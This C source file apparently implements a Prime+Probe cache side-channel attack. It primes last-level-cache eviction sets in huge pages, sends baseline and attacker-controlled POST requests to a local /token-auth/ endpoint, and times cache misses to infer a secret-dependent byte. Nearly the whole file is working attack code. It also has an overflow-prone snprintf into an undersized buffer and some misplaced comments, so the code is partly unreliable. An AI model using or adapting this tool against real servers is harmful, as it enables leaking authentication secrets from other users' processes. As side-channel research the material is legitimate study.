#include <stdio.h>
#include <stdint.h>

#include <x86intrin.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "attacker.h"

#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

// LLC details
#define LLC_SETS 12288
#define LLC_WAYS 16
#define LLC_SIZE (LLC_WAYS * LLC_SETS * LINE_SIZE)
#define HUGE_PAGE_SIZE (2 * 1024 * 1024) // 2mb

// prime+probe
#define ATTACK_RUNS 10000
#define EVICTION_THRESHOLD 7000
#define CACHE_STRIDE 4096
#define PROBE_SIZE (256 * 1024 * 1024) // 256mb
#define PAGE_COUNT (PROBE_SIZE / HUGE_PAGE_SIZE)
// socket
#define PORT 8080
#define INET "127.0.0.1"


uint8_t *probe_head;

uint64_t c_threshold;

char buf[1024]= {0};

int main(int argc, char* argv[]) {
     // setup socket connection 
    int clientfd;
    struct sockaddr_in servaddr;
    open_socket(&clientfd, &servaddr);
    connect(clientfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

    // allocate mem to probe_head
    probe_arr_setup();
    printf("Probe array base address: %p\n", (void*)probe_head);

    uint8_t target_byte = 0x23;
    node_t *probe_arr = build_linked_list(target_byte);

    // threshold for classifying cache miss
    c_threshold = EVICTION_THRESHOLD;

    char *baseline_data = 
    "POST /token-auth/ HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Length: 35\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "username=none&password=none&id=0000";
    char attack_data[256];
    get_inputs(attack_data, argc, argv);
    
    // get page table entries in cache lookup
    // for (int i = 0; i < SETS; i++) {
    //     for (int w = 0; w < WAYS; w++) {
    //         volatile uint8_t *addr = &probe_array[(w * 4096) + (i * LINE_SIZE)];
    //         volatile uint8_t dummy = *addr; 
    //     }
    // }
    // _mm_mfence();
    
    int baseline_count = 0;
    int attack_count = 0;
    for (int j = 0; j < ATTACK_RUNS; j++) {

        //PRIME
        prime_cache(probe_arr);

        // BASELINE
        send(clientfd, baseline_data, strlen(baseline_data), 0);
        int n = -1;
        while (n < 0) {
            n = recv(clientfd, buf, sizeof(buf), 0); // deetct response started
        }

        //PROBE
        check_cache_presence(probe_arr, &baseline_count);

        while (n > 0) {
            n = recv(clientfd, buf, sizeof(buf), 0); // drain socket buf
        }

        // = ATTACK =
        //PRIME
        prime_cache(probe_arr);

        // ATTACK
        send(clientfd, attack_data, strlen(attack_data), 0);
        
        n = -1;
        while (n < 0) {
            n = recv(clientfd, buf, sizeof(buf), 0); // detect response started
        }

        //PROBE
        check_cache_presence(probe_arr, &attack_count);

        while (n > 0) {
            n = recv(clientfd, buf, sizeof(buf), 0); // drain socket
        }
    } 

    printf("\n===== EVICTION COUNT FOR BYTE %x =====\n", target_byte);
    int diff = attack_count - baseline_count;
    printf("\n- COUNT: %d misses\n- ATTACK: %d misses\n- BASELINE: %d misses\n", diff, attack_count, baseline_count);

    close(clientfd);
    return 0;

}

// takes in a byte and builds up an array of pointers(addresses) to prime+probe associated with that byte
void probe_arr_setup(){
    // allocates mem for probe space (pointer chain)
    probe_head = mmap(NULL, PROBE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0); // allocate 256mb in RAM using hugetlb size pages (2MB)
    if (probe_head == MAP_FAILED) {
        perror("mmap failed");
        exit(1);
    }
    memset(probe_head, 1, PROBE_SIZE); // make OS give physical ram 
}

// takes in a byte and builds up an array of pointers(addresses) to prime+probe associated with that byte
node_t* build_linked_list(uint8_t target_byte){
    // find addresses associated with the byte
    size_t byte_offset = CACHE_STRIDE * target_byte;

    node_t *byte_addresses[PAGE_COUNT];

    // loop for each page and get addresses for that byte
    for (int p = 0; p < PAGE_COUNT; p++) {
        node_t *addr = (node_t *)(probe_head + (p * HUGE_PAGE_SIZE) + byte_offset);
        byte_addresses[p] = addr;
    }

    // shuffle to trick prefetcher
    for(int i = 0; i < PAGE_COUNT; i++){
        node_t *tmp = byte_addresses[i];
        int shuffle_index = rand() % PAGE_COUNT;
        // swap
        byte_addresses[i] = byte_addresses[shuffle_index];
        byte_addresses[shuffle_index] = tmp;
    }

    // link the pointer chain 
    for (int i = 0; i < PAGE_COUNT-1; i++){
        byte_addresses[i]->next = byte_addresses[i+1];
    }
    byte_addresses[PAGE_COUNT-1]->next = NULL;

    // return start of pointer chain
    return byte_addresses[0];
}


// Prime LLC
void prime_cache(node_t *base_ptr){
    // loops through pointer array for a byte 3 times
    for(int i = 0; i < 3; i++){
        node_t *current = base_ptr;
        while (current != NULL){
            current = current->next;
        }
    }
    _mm_mfence();
}

void check_cache_presence(node_t *base_ptr, int *result){
    uint64_t t1, t2;
    unsigned int pid;

    node_t *current = base_ptr;
    _mm_mfence();
    t1 = __rdtscp(&pid); 
    _mm_lfence();

    // loop through all set pointer addresses
    while (current != NULL){
        current = current->next;
    }

    _mm_lfence();
    t2 = __rdtscp(&pid);
    _mm_lfence();

    if (t2 - t1 > c_threshold){ // if miss detected
        (*result)++;
    }
}


void get_inputs(char attack_data[], int argc, char* argv[]){

    char *attack_id = "4096";
    if (argc == 2){
        attack_id = argv[1]; 
    }
    char body[128];
    int body_len = snprintf(body, sizeof(body), "username=none&password=none&id=%s", attack_id);

    snprintf(attack_data, 512, 
        "POST /token-auth/ HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Content-Length: %d\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n\r\n"
        "%s", body_len, body);
}

void open_socket(int *clientfd, struct sockaddr_in *servaddr){
    
    *clientfd = socket(AF_INET, SOCK_STREAM, 0);

    int flags = fcntl(*clientfd, F_GETFL, 0);
    fcntl(*clientfd, F_SETFL, flags | O_NONBLOCK);

    servaddr->sin_family = AF_INET;
    servaddr->sin_port = htons(PORT);
    servaddr->sin_addr.s_addr = inet_addr(INET);
}


void shuffle(int shuffle_arr[]){
    for (int i = 0; i < LLC_SETS; i++){
        int tmp = shuffle_arr[i];
        int shuffle_index = rand() % LLC_SETS;
        shuffle_arr[i] = shuffle_arr[shuffle_index];
        shuffle_arr[shuffle_index] = tmp;
    }
}
